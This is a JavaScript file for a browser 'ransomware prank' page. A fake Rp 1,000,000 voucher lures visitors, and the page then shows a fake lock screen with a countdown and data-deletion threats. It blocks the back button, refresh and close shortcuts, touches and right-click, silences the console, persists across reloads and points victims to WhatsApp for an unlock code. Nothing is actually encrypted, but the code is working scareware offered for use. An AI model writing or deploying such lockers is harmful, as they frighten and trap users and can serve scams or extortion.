// ============================================
// SUPER LOCK RANSOMWARE PRANK - ULTIMATE VERSION
// TIDAK BISA KELUAR SEBELUM MASUKKAN KODE BENAR!
// ============================================

// Konfigurasi
const CONFIG = {
    CORRECT_CODE: "wanztamvan",
    MAX_ATTEMPTS: 5,
    INITIAL_TIME: 3600, // 60 menit dalam detik
    BLOCK_DURATION: 30000, // 30 detik setelah max attempts
    VERSION: "SUPER_LOCK_1.0"
};

// State
let state = {
    isLocked: false,
    attempts: 0,
    timeLeft: CONFIG.INITIAL_TIME,
    timerInterval: null,
    isInputBlocked: false,
    lastError: "",
    audioPlaying: false
};

// DOM Elements
const elements = {
    mainPage: document.getElementById('mainPage'),
    lockScreen: document.getElementById('lockScreen'),
    claimButton: document.getElementById('claimButton'),
    unlockInput: document.getElementById('unlockCodeInput'),
    submitButton: document.getElementById('submitCodeBtn'),
    countdownTimer: document.getElementById('countdownTimer'),
    attemptCount: document.getElementById('attemptCount'),
    errorDisplay: document.getElementById('errorDisplay'),
    glitchText: document.getElementById('glitchText'),
    userCount: document.getElementById('userCount'),
    whatsappBtn: document.getElementById('whatsappBtn'),
    fullBlocker: document.getElementById('fullScreenBlocker'),
    forceFocus: document.getElementById('forceFocus'),
    
    // Audio
    scarySound: document.getElementById('scarySound'),
    tickingSound: document.getElementById('tickingSound'),
    errorSound: document.getElementById('errorSound')
};

// ===== INITIALIZATION =====
function init() {
    console.log(`🔧 ${CONFIG.VERSION} Initializing...`);
    
    // Set random user count
    elements.userCount.textContent = Math.floor(Math.random() * 2000) + 1000;
    
    // Setup event listeners
    setupEventListeners();
    
    // Check if already locked
    if (localStorage.getItem('superLockActive') === 'true') {
        console.log('🔒 Restoring locked state');
        activateSuperLock();
    }
    
    // Start glitch effect
    startGlitchEffect();
    
    console.log('✅ System ready');
}

// ===== EVENT LISTENERS =====
function setupEventListeners() {
    // Tombol Claim
    elements.claimButton.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('🎯 Claim button clicked');
        
        const confirmed = confirm(
            "⚠️ APAKAH ANDA YAKIN?\n\n" +
            "Klik OK untuk mendapatkan voucher Rp 1.000.000!\n" +
            "Pastikan koneksi internet stabil."
        );
        
        if (confirmed) {
            console.log('✅ User confirmed claim');
            activateSuperLock();
        } else {
            console.log('❌ User cancelled');
            alert("Voucher dibatalkan! Silahkan refresh halaman untuk mencoba lagi.");
        }
    });
    
    // Submit code
    elements.submitButton.addEventListener('click', verifyCode);
    
    // Enter key in input
    elements.unlockInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !state.isInputBlocked) {
            verifyCode();
        }
    });
    
    // Force focus on input when tapped anywhere
    elements.lockScreen.addEventListener('touchstart', function() {
        if (state.isLocked && !state.isInputBlocked) {
            elements.unlockInput.focus();
        }
    });
    
    // WhatsApp button
    elements.whatsappBtn.addEventListener('click', function(e) {
        if (state.isLocked) {
            // Allow WhatsApp to open
            setTimeout(() => {
                showError("⚠️ Don't forget to come back and enter the code!");
            }, 1000);
        }
    });
}

// ===== ACTIVATE SUPER LOCK =====
function activateSuperLock() {
    console.log('🔐 ACTIVATING SUPER LOCK...');
    
    // Switch pages
    elements.mainPage.classList.remove('active');
    elements.lockScreen.classList.add('active');
    
    // Update state
    state.isLocked = true;
    localStorage.setItem('superLockActive', 'true');
    
    // Enable full lock mode
    enableFullLockMode();
    
    // Start features
    startRansomwareTimer();
    playScaryAudio();
    blockAllEscapes();
    setupGlitchEffects();
    
    // Focus on input
    setTimeout(() => {
        elements.unlockInput.focus();
        elements.unlockInput.select();
    }, 1000);
    
    // Log activation
    console.log('✅ SUPER LOCK ACTIVATED');
    console.log('🚫 All escape routes blocked');
}

// ===== FULL LOCK MODE =====
function enableFullLockMode() {
    console.log('🛡️ Enabling full lock mode...');
    
    // Add locked class to body
    document.body.classList.add('locked');
    
    // Show full blocker
    elements.fullBlocker.style.display = 'block';
    
    // Block all touch events except on ransomware container
    document.addEventListener('touchstart', blockAllTouches, { capture: true, passive: false });
    document.addEventListener('click', blockAllClicks, { capture: true });
    
    // Block keyboard globally
    document.addEventListener('keydown', blockGlobalKeys, { capture: true });
    
    // Prevent context menu
    document.addEventListener('contextmenu', blockContext, { capture: true });
    
    // Block pull-to-refresh
    document.addEventListener('touchmove', blockPullToRefresh, { capture: true, passive: false });
    
    // Prevent zoom
    document.addEventListener('gesturestart', blockGestures, { capture: true });
    document.addEventListener('gesturechange', blockGestures, { capture: true });
    document.addEventListener('gestureend', blockGestures, { capture: true });
    
    // Block navigation buttons (Android)
    blockNavigationButtons();
    
    // Prevent sleep mode
    keepAwake();
}

// ===== BLOCK ALL TOUCHES =====
function blockAllTouches(e) {
    if (!e.target.closest('.ransomware-container')) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        showError("❌ Touch disabled outside lock area!");
        playErrorSound();
        return false;
    }
}

function blockAllClicks(e) {
    if (!e.target.closest('.ransomware-container')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
}

// ===== BLOCK GLOBAL KEYS =====
function blockGlobalKeys(e) {
    const blockedKeys = [
        'F5', 'F12', 'F11', 'Escape',
        'PrintScreen', 'ScrollLock', 'Pause'
    ];
    
    const blockedCombos = [
        { ctrl: true, key: 'r' },
        { ctrl: true, key: 'R' },
        { ctrl: true, shift: true, key: 'r' },
        { ctrl: true, shift: true, key: 'R' },
        { ctrl: true, key: 'w' },
        { ctrl: true, key: 'W' },
        { alt: true, key: 'F4' },
        { alt: true, key: 'Tab' },
        { meta: true, key: 'r' }, // Cmd+R for Mac
        { meta: true, key: 'w' }  // Cmd+W for Mac
    ];
    
    // Check single keys
    if (blockedKeys.includes(e.key)) {
        e.preventDefault();
        e.stopPropagation();
        showError(`⛔ ${e.key} BLOCKED!`);
        playErrorSound();
        return false;
    }
    
    // Check key combinations
    for (const combo of blockedCombos) {
        const ctrlMatch = !combo.ctrl || e.ctrlKey || e.metaKey;
        const shiftMatch = !combo.shift || e.shiftKey;
        const keyMatch = e.key.toLowerCase() === combo.key.toLowerCase();
        
        if (ctrlMatch && shiftMatch && keyMatch) {
            e.preventDefault();
            e.stopPropagation();
            showError("⛔ SHORTCUT BLOCKED!");
            playErrorSound();
            return false;
        }
    }
    
    // Allow typing in input field
    if (e.target === elements.unlockInput) {
        return true;
    }
    
    // Block all other keys when not in input
    if (!state.isInputBlocked && e.key.length === 1) {
        elements.unlockInput.focus();
    }
}

// ===== BLOCK CONTEXT MENU =====
function blockContext(e) {
    e.preventDefault();
    e.stopPropagation();
    showError("⛔ RIGHT CLICK DISABLED!");
    playErrorSound();
    return false;
}

// ===== BLOCK PULL TO REFRESH =====
function blockPullToRefresh(e) {
    if (e.touches.length > 1) {
        e.preventDefault();
        e.stopPropagation();
        showError("⛔ MULTI-TOUCH DISABLED!");
        return false;
    }
    
    const startY = e.touches[0].clientY;
    if (startY < 50) { // Top of screen
        e.preventDefault();
        e.stopPropagation();
        showError("⛔ PULL-TO-REFRESH BLOCKED!");
        return false;
    }
}

// ===== BLOCK GESTURES =====
function blockGestures(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
}

// ===== BLOCK NAVIGATION BUTTONS =====
function blockNavigationButtons() {
    console.log('📱 Blocking navigation buttons...');
    
    // Block back button
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.pushState(null, null, location.href);
        showError("⛔ BACK BUTTON DISABLED!");
        shakeScreen();
        return false;
    };
    
    // Block beforeunload (closing tab)
    window.addEventListener('beforeunload', function(e) {
        if (state.isLocked) {
            e.preventDefault();
            e.returnValue = '';
            showError("⚠️ DON'T CLOSE THE BROWSER!");
            return '';
        }
    });
    
    // Block visibility change (switching apps)
    document.addEventListener('visibilitychange', function() {
        if (state.isLocked && document.hidden) {
            // User switched tabs or minimized
            showError("⚠️ DON'T SWITCH APPS!");
            
            // Try to bring back focus
            setTimeout(() => {
                if (!document.hidden) {
                    elements.unlockInput.focus();
                }
            }, 100);
        }
    });
}

// ===== KEEP AWAKE =====
function keepAwake() {
    // Prevent screen from sleeping
    if ('wakeLock' in navigator) {
        navigator.wakeLock.request('screen')
            .then(wakeLock => {
                console.log('🛡️ Wake lock active');
            })
            .catch(err => {
                console.log('⚠️ Wake lock not supported:', err);
            });
    }
    
    // Keep CPU active
    let wakeLockInterval = setInterval(() => {
        if (!state.isLocked) {
            clearInterval(wakeLockInterval);
            return;
        }
        // Do nothing, just keep script running
    }, 30000);
}

// ===== RANSOMWARE TIMER =====
function startRansomwareTimer() {
    clearInterval(state.timerInterval);
    
    state.timerInterval = setInterval(() => {
        if (!state.isLocked) {
            clearInterval(state.timerInterval);
            return;
        }
        
        const minutes = Math.floor(state.timeLeft / 60);
        const seconds = state.timeLeft % 60;
        
        elements.countdownTimer.textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        // Effects based on time
        if (state.timeLeft < 300) { // 5 minutes
            elements.countdownTimer.style.color = '#ff0000';
            elements.countdownTimer.style.textShadow = '0 0 20px #ff0000';
            elements.countdownTimer.style.animation = 'glitch 0.5s infinite';
        }
        
        if (state.timeLeft < 60) { // 1 minute
            elements.countdownTimer.style.fontSize = '2.5rem';
            playTickingFaster();
        }
        
        if (state.timeLeft <= 0) {
            clearInterval(state.timerInterval);
            elements.countdownTimer.textContent = "00:00";
            showError("⏰ TIME'S UP! DATA WILL BE DELETED!");
            playDestructionSound();
        }
        
        state.timeLeft--;
    }, 1000);
}

// ===== AUDIO FUNCTIONS =====
function playScaryAudio() {
    try {
        elements.scarySound.volume = 0.4;
        elements.tickingSound.volume = 0.3;
        
        elements.scarySound.play();
        elements.tickingSound.play();
        
        state.audioPlaying = true;
        console.log('🎵 Playing scary audio...');
    } catch (error) {
        console.log('⚠️ Audio blocked:', error);
    }
}

function playTickingFaster() {
    if (elements.tickingSound.playbackRate !== 2.0) {
        elements.tickingSound.playbackRate = 2.0;
    }
}

function playErrorSound() {
    try {
        elements.errorSound.currentTime = 0;
        elements.errorSound.play();
    } catch (error) {
        // Ignore audio errors
    }
}

function playDestructionSound() {
    // Could add more intense sound here
    elements.scarySound.volume = 0.8;
}

// ===== CODE VERIFICATION =====
function verifyCode() {
    if (state.isInputBlocked) {
        showError("⏳ Please wait... Input blocked!");
        return;
    }
    
    const enteredCode = elements.unlockInput.value.trim().toLowerCase();
    
    if (!enteredCode) {
        showError("⚠️ Please enter unlock code!");
        shakeElement(elements.unlockInput);
        playErrorSound();
        return;
    }
    
    state.attempts++;
    elements.attemptCount.textContent = state.attempts;
    
    if (enteredCode === CONFIG.CORRECT_CODE) {
        // CORRECT CODE - UNLOCK DEVICE
        unlockDevice();
    } else {
        // WRONG CODE
        if (state.attempts >= CONFIG.MAX_ATTEMPTS) {
            // MAX ATTEMPTS REACHED
            blockInputTemporarily();
            showError(`🚫 MAX ATTEMPTS REACHED! Contact WhatsApp for code.`);
            elements.unlockInput.disabled = true;
            elements.submitButton.disabled = true;
        } else {
            showError(`❌ WRONG CODE! Attempts: ${state.attempts}/${CONFIG.MAX_ATTEMPTS}`);
            shakeElement(elements.unlockInput);
            playErrorSound();
            elements.unlockInput.value = "";
            elements.unlockInput.focus();
        }
    }
}

function blockInputTemporarily() {
    state.isInputBlocked = true;
    
    const originalText = elements.submitButton.textContent;
    elements.submitButton.textContent = `BLOCKED (${CONFIG.BLOCK_DURATION/1000}s)`;
    elements.submitButton.style.background = '#666';
    elements.submitButton.style.cursor = 'not-allowed';
    
    let timeLeft = CONFIG.BLOCK_DURATION / 1000;
    const countdown = setInterval(() => {
        timeLeft--;
        elements.submitButton.textContent = `BLOCKED (${timeLeft}s)`;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            state.isInputBlocked = false;
            elements.submitButton.textContent = originalText;
            elements.submitButton.style.background = '';
            elements.submitButton.style.cursor = '';
            elements.unlockInput.disabled = false;
            elements.submitButton.disabled = false;
            elements.unlockInput.value = "";
            elements.unlockInput.focus();
            elements.errorDisplay.textContent = "";
        }
    }, 1000);
}

// ===== UNLOCK DEVICE =====
function unlockDevice() {
    console.log('🔓 UNLOCKING DEVICE...');
    
    // Clear everything
    clearInterval(state.timerInterval);
    state.isLocked = false;
    
    // Stop audio
    elements.scarySound.pause();
    elements.tickingSound.pause();
    elements.scarySound.currentTime = 0;
    elements.tickingSound.currentTime = 0;
    
    // Remove event listeners
    document.removeEventListener('touchstart', blockAllTouches, { capture: true });
    document.removeEventListener('click', blockAllClicks, { capture: true });
    document.removeEventListener('keydown', blockGlobalKeys, { capture: true });
    document.removeEventListener('contextmenu', blockContext, { capture: true });
    document.removeEventListener('touchmove', blockPullToRefresh, { capture: true });
    
    // Clear localStorage
    localStorage.removeItem('superLockActive');
    
    // Remove locked class
    document.body.classList.remove('locked');
    
    // Hide blocker
    elements.fullBlocker.style.display = 'none';
    
    // Show success message
    setTimeout(() => {
        alert(
            "✅ CONGRATULATIONS!\n\n" +
            "Your device has been successfully unlocked!\n\n" +
            "💰 VOUCHER Rp 1.000.000: TIKTOK-2024-XYZ\n" +
            "(This was just a PRANK! No data was actually encrypted)\n\n" +
            "Thanks for playing! 😄"
        );
        
        // Reload page
        location.reload();
    }, 500);
}

// ===== VISUAL EFFECTS =====
function startGlitchEffect() {
    setInterval(() => {
        if (!state.isLocked) return;
        
        const texts = [
            "SYSTEM LOCKED - VIRUS DETECTED",
            "RANSOMWARE ACTIVE - PAY NOW",
            "DEVICE ENCRYPTED - DATA LOCKED",
            "WARNING: CRITICAL INFECTION",
            "ALERT: SYSTEM COMPROMISED"
        ];
        
        const randomText = texts[Math.floor(Math.random() * texts.length)];
        elements.glitchText.textContent = randomText;
        
        // Random glitch effect
        if (Math.random() > 0.7) {
            elements.glitchText.style.textShadow = `0 0 20px #${Math.floor(Math.random()*16777215).toString(16)}`;
        }
        
        setTimeout(() => {
            elements.glitchText.style.textShadow = '0 0 15px #ff0000';
        }, 100);
    }, 3000);
}

function setupGlitchEffects() {
    // Add CSS for glitch animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
            20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
    `;
    document.head.appendChild(style);
}

function shakeElement(element) {
    element.style.animation = 'shake 0.5s';
    setTimeout(() => {
        element.style.animation = '';
    }, 500);
}

function shakeScreen() {
    document.body.style.animation = 'shake 0.5s';
    setTimeout(() => {
        document.body.style.animation = '';
    }, 500);
}

// ===== ERROR DISPLAY =====
function showError(message) {
    elements.errorDisplay.textContent = message;
    elements.errorDisplay.style.color = '#ff0000';
    
    // Auto clear after 3 seconds
    setTimeout(() => {
        if (elements.errorDisplay.textContent === message) {
            elements.errorDisplay.textContent = '';
        }
    }, 3000);
}

// ===== BLOCK ALL ESCAPES =====
function blockAllEscapes() {
    console.log('🚫 Blocking all escape routes...');
    
    // Prevent any new windows
    window.open = function() {
        showError("⛔ POPUP WINDOWS BLOCKED!");
        return null;
    };
    
    // Override alert to prevent use
    const originalAlert = window.alert;
    window.alert = function(msg) {
        if (state.isLocked && !msg.includes("CONGRATULATIONS")) {
            showError("⛔ ALERT FUNCTION BLOCKED!");
            return;
        }
        return originalAlert(msg);
    };
    
    // Block console access attempts
    if (typeof console !== 'undefined') {
        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};
    }
}

// ===== DEVELOPER BACKDOOR =====
// Press Ctrl+Alt+Shift+U to force unlock (for testing)
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.altKey && e.shiftKey && e.key === 'U') {
        if (state.isLocked) {
            console.log('🛠️ Developer backdoor activated');
            unlockDevice();
        }
    }
});

// ===== INITIALIZE ON LOAD =====
window.addEventListener('load', init);
window.addEventListener('DOMContentLoaded', init);

// Prevent any errors from breaking the lock
window.addEventListener('error', function(e) {
    console.log('⚠️ Error caught:', e.message);
    e.preventDefault();
    return true;
});

console.log(`🔥 ${CONFIG.VERSION} - SUPER LOCK RANSOMWARE PRANK LOADED`);